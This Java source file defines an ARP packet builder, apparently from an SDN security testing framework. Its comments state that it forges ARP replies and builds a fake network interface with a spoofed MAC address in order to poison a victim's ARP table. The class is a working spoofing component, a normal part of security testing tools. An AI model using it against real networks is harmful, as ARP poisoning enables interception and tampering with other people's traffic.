package org.deltaproject.channelagent.pkthandler;

import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;

/*
 * This class is used to create arp packets, an arp packet can either be 
 * an arp request or an arp reply. This class provides methods to generate fake 
 * arp requests and replies packets to poison the victim's arp table
 * 
 * ATTENTION: in order to fully understand the packets' structure and how arp protocol
 * works you can check the official jpcap documentation(it also provides examples)
 * and wikipedia, these details are not covered into the code's comments
 */
public class ARPPkt {
	private NetworkInterface device;
	private ARPPacket packet;
	
	private Inet4Address dest_ip;
	private byte [] dest_mac;
	
	/*
	 * Generates an ethernet packet using as destination mac the given dest_mac
	 * the src(source) mac is attacker's mac taken from the given device(network interface)
	 */
	private EthernetPacket generate_ethernet_packet(byte[] dest_mac) throws NullPointerException {
		if (this.device == null) throw new NullPointerException("No device has been given! potato");
		
		// generate ethernet packet
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac = this.device.mac_address;
		ether.dst_mac = dest_mac;
		
		// set datalink for arp packet
		this.packet.datalink = ether;
		
		return ether;
	}
	
	/*
	 * Same as the previous method but in this case you can also provide the src mac to be used
	 * in the generated ethernet packet
	 */
	private EthernetPacket generate_ethernet_packet(byte[] official_mac,byte[] dest_mac) throws NullPointerException {
		if (this.device == null) throw new NullPointerException("No device has been given! potato");
		
		// generate ethernet packet
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac = official_mac;
		ether.dst_mac = dest_mac;
		
		// set datalink for arp packet
		this.packet.datalink = ether;
		
		return ether;
	}
	
	/*
	 * returns a valid active  Inet4Address(which is actually the ip our device has in the lan network) 
	 * from the device
	 */
	private NetworkInterfaceAddress get_inet4() throws NullPointerException {
		if (this.device == null) throw new NullPointerException("No device has been given! potato");
		
		for(NetworkInterfaceAddress addr : this.device.addresses)
			if(addr.address instanceof Inet4Address)
				return addr;
				
		return null;
	}
	
	/*
	 * given as an input a String mac it returns the given mac 
	 * as a byte array 
	 */
	private byte[] calculate_mac(String mac) {
		String[] macAddressParts = mac.split(":");
		
		// convert hex string to byte values
		byte[] macAddressBytes = new byte[6];
		for(int i=0; i<6; i++){
		    Integer hex = Integer.parseInt(macAddressParts[i], 16);
		    macAddressBytes[i] = hex.byteValue();
		}
		
		return macAddressBytes;
	}
	
	/*
	 * constructor of the class(thanks captain obvious)
	 * takes as input a device(network interface)
	 * also it initializes some headers of the arp packet
	 */
	public ARPPkt(NetworkInterface device){
		this.device = device;
		
		// define arp packet
		this.packet = new ARPPacket();
		// Set the parameters of the ARP packet.
		this.packet.hardtype = ARPPacket.HARDTYPE_ETHER;
		this.packet.prototype = ARPPacket.PROTOTYPE_IP;
		this.packet.hlen = 6; // Hardware address length
		this.packet.plen = 4; // Protocol address length

	}
	
	/*
	 * this method generate an arp request using as destination ip the dest_ip parameter
	 */
	public ARPPacket build_request_packet(String dest_ip) throws NullPointerException, UnknownHostException {
		if (this.device == null) throw new NullPointerException("No device has been given! potato");
		
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};
		
		this.packet.operation = ARPPacket.ARP_REQUEST;
		
		//these are basic headers for the arp packet
		this.packet.sender_hardaddr = this.device.mac_address;
		this.packet.sender_protoaddr = this.get_inet4().address.getAddress();
		this.packet.target_hardaddr = broadcast;
		this.packet.target_protoaddr = InetAddress.getByName(dest_ip).getAddress();
		
		this.generate_ethernet_packet(broadcast);

		return this.packet;
	}
	
	/*
	 * this method generates an arp reply(mostly fake packets) using the given parameters
	 */
	public ARPPacket build_reply_packet(String dest_ip, String dest_mac , byte[] official_mac) throws NullPointerException, UnknownHostException {
		if (this.device == null) throw new NullPointerException("No device has been given! potato");
				
		this.packet.operation = ARPPacket.ARP_REPLY;
		this.packet.sender_hardaddr = this.device.mac_address;
		this.packet.sender_protoaddr = this.get_inet4().address.getAddress();
		this.packet.target_hardaddr = this.calculate_mac(dest_mac);
		this.packet.target_protoaddr = InetAddress.getByName(dest_ip).getAddress();
		
		this.generate_ethernet_packet(official_mac, this.calculate_mac(dest_mac));

		return this.packet;
	}
	
	/*
	 * This method is very mandatory because it is used to build a fake network interface
	 * which will be used to generate fake arp reply packets to poison our targets
	 * for more information for the parameters you can always check the jpcap documentation
	 * to find out more about how a device(network interface) is represented in jpcap 
	 */
	public void buildDevice(String name, 
			String description, String datalink_name, 
			String datalink_description, byte[] mac, 
			String address, String subnet) throws UnknownHostException, SocketException{
		InetAddress iaddr = InetAddress.getByName(address);
		InetAddress iaddr_subnet = InetAddress.getByName(subnet);
		
		NetworkInterfaceAddress addr = new NetworkInterfaceAddress(iaddr.getAddress(), 
				iaddr_subnet.getAddress(), null, null);
		
		NetworkInterfaceAddress[] arr = new NetworkInterfaceAddress[1];
		arr[0] = addr;
	
		this.device = new NetworkInterface(name, description, false, datalink_name,
				datalink_description, mac, arr);
	}
	
	/*
	 * from here and below we have some getters and setters methods, classic stuff
	 */
	
	public NetworkInterface getDevice() {
		return device;
	}

	public void setDevice(NetworkInterface device) {
		this.device = device;
	}

	public ARPPacket getPacket() {
		return packet;
	}

	public void setPacket(ARPPacket packet) {
		this.packet = packet;
	}

	public Inet4Address getDest_ip() {
		return dest_ip;
	}

	public void setDest_ip(Inet4Address dest_ip) {
		this.dest_ip = dest_ip;
	}

	public byte[] getDest_mac() {
		return dest_mac;
	}

	public void setDest_mac(byte[] dest_mac) {
		this.dest_mac = dest_mac;
	}
	
	public void print() {
	}

}
